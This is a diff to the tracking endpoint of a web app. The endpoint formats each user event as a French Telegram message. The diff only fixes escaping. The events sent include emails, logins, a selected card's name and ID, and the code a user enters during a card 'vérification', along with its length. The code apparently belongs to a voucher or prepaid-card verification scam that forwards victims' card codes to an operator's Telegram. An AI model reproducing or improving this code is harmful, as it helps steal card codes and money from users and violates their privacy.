@@ -194,41 +194,41 @@ app.post('/api/track', async (req: any, res: any) => {
   
   switch(event) {
     case 'PAGE_VIEW':
-      message = `📍 *Visite de Page*\\n\\n👤 User: ${userEmail}\\n📄 Page: ${data.page}\\n🕐 ${timestamp}`;
+      message = `📍 *Visite de Page*\n\n👤 User: ${userEmail}\n📄 Page: ${data.page}\n🕐 ${timestamp}`;
       break;
     case 'AUTH_LOGIN':
-      message = `🔐 *Connexion*\\n\\n👤 User: ${data.email}\\n✅ Statut: Connecté\\n🕐 ${timestamp}`;
+      message = `🔐 *Connexion*\n\n👤 User: ${data.email}\n✅ Statut: Connecté\n🕐 ${timestamp}`;
       break;
     case 'AUTH_SIGNUP':
-      message = `✨ *Nouvelle Inscription*\\n\\n👤 Nom: ${data.name}\\n📧 Email: ${data.email}\\n🕐 ${timestamp}`;
+      message = `✨ *Nouvelle Inscription*\n\n👤 Nom: ${data.name}\n📧 Email: ${data.email}\n🕐 ${timestamp}`;
       break;
     case 'VERIFY_START':
-      message = `🚀 *Début Vérification*\\n\\n👤 User: ${userEmail}\\n💳 Carte: ${data.cardName || 'Non sélectionnée'}\\n🕐 ${timestamp}`;
+      message = `🚀 *Début Vérification*\n\n👤 User: ${userEmail}\n💳 Carte: ${data.cardName || 'Non sélectionnée'}\n🕐 ${timestamp}`;
       break;
     case 'VERIFY_CARD_SELECTED':
-      message = `💳 *Carte Sélectionnée*\\n\\n👤 User: ${userEmail}\\n💳 Type: ${data.cardName}\\n🆔 ID: ${data.cardId}\\n🕐 ${timestamp}`;
+      message = `💳 *Carte Sélectionnée*\n\n👤 User: ${userEmail}\n💳 Type: ${data.cardName}\n🆔 ID: ${data.cardId}\n🕐 ${timestamp}`;
       break;
     case 'VERIFY_EMAIL_ENTERED':
-      message = `📧 *Email Saisi*\\n\\n👤 User: ${userEmail}\\n📧 Email saisi: ${data.email}\\n💳 Carte: ${data.cardName}\\n🕐 ${timestamp}`;
+      message = `📧 *Email Saisi*\n\n👤 User: ${userEmail}\n📧 Email saisi: ${data.email}\n💳 Carte: ${data.cardName}\n🕐 ${timestamp}`;
       break;
     case 'VERIFY_CODE_ENTERED':
-      message = `🔢 *Code Saisi*\\n\\n👤 User: ${userEmail}\\n📧 Email: ${data.email}\\n💳 Carte: ${data.cardName}\\n🔑 Code: \\`${data.code}\\`\\n📏 Longueur: ${data.code?.length} caractères\\n🕐 ${timestamp}`;
+      message = `🔢 *Code Saisi*\n\n👤 User: ${userEmail}\n📧 Email: ${data.email}\n💳 Carte: ${data.cardName}\n🔑 Code: '${data.code}'\n📏 Longueur: ${data.code?.length} caractères\n🕐 ${timestamp}`;
       break;
     case 'VERIFY_ANALYSIS_START':
-      message = `⚙️ *Analyse en Cours*\\n\\n👤 User: ${userEmail}\\n📧 Email: ${data.email}\\n🔑 Code: \\`${data.code}\\`\\n🕐 ${timestamp}`;
+      message = `⚙️ *Analyse en Cours*\n\n👤 User: ${userEmail}\n📧 Email: ${data.email}\n🔑 Code: '${data.code}'\n🕐 ${timestamp}`;
       break;
     case 'VERIFY_RESULT':
       const resultIcon = data.success ? '✅' : '❌';
-      message = `${resultIcon} *Résultat Vérification*\\n\\n👤 User: ${userEmail}\\n📧 Email: ${data.email}\\n🔑 Code: \\`${data.code}\\`\\n📊 Résultat: ${data.success ? 'VALIDE ✅' : 'INVALIDE ❌'}\\n🕐 ${timestamp}`;
+      message = `${resultIcon} *Résultat Vérification*\n\n👤 User: ${userEmail}\n📧 Email: ${data.email}\n🔑 Code: '${data.code}'\n📊 Résultat: ${data.success ? 'VALIDE ✅' : 'INVALIDE ❌'}\n🕐 ${timestamp}`;
       break;
     case 'BUY_START':
-      message = `🛒 *Achat Démarré*\\n\\n👤 User: ${userEmail}\\n🕐 ${timestamp}`;
+      message = `🛒 *Achat Démarré*\n\n👤 User: ${userEmail}\n🕐 ${timestamp}`;
       break;
     case 'PROMO_START':
-      message = `🎁 *Promotion Démarrée*\\n\\n👤 User: ${userEmail}\\n💝 Type: Saint-Valentin\\n🕐 ${timestamp}`;
+      message = `🎁 *Promotion Démarrée*\n\n👤 User: ${userEmail}\n💝 Type: Saint-Valentin\n🕐 ${timestamp}`;
       break;
     default:
-      message = `📊 *Événement: ${event}*\\n\\n👤 User: ${userEmail}\\n📦 Data: ${JSON.stringify(data)}\\n🕐 ${timestamp}`;
+      message = `📊 *Événement: ${event}*\n\n👤 User: ${userEmail}\n📦 Data: ${JSON.stringify(data)}\n🕐 ${timestamp}`;
   }
   
   await sendTelegramMessage(message);
